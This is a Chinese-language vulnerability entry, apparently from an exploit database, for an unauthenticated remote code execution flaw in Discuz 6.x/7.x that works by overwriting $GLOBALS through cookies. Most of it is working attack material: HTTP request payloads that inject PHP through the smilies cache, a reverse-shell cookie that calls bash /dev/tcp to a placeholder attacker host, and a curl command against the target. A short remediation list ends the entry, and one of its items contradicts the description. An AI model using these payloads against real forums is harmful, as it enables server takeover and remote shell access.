---
id: DISCUZ-WOOYUN-2010-080723
title: Discuz 7.x/6.x 全局变量防御绕过导致RCE漏洞
product: discuz
vendor: Discuz
version_affected: "6.x, 7.x"
severity: CRITICAL
tags: [rce, 全局变量绕过, 无需认证]
fingerprint: ["Discuz", "论坛"]
---

## 漏洞描述

Discuz 7.x/6.x版本中，由于PHP 5.3.x的`request_order`默认值为"GP"，`$_REQUEST`不再包含`$_COOKIE`。攻击者可通过Cookie传入`$GLOBALS`覆盖全局变量，最终导致RCE。

## 影响版本

- Discuz 6.x
- Discuz 7.x

## 前置条件

- PHP 5.3.x
- 无需认证

## 利用步骤

1. 找到一个已存在的帖子
2. 在Cookie中构造GLOBALS覆盖payload
3. 访问帖子触发RCE

## Payload

```http
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: target:8080
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();

# 反弹shell
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=system('bash -i >& /dev/tcp/attacker-ip/port 0>&1');
```

## 验证方法

```bash
# 发送payload后检查响应
curl -H "Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();" "http://target:8080/viewthread.php?tid=10"
```

## 修复建议

1. 升级Discuz至最新版本
2. 修改php.ini设置`request_order="GP"`
3. 禁用危险的全局变量注册
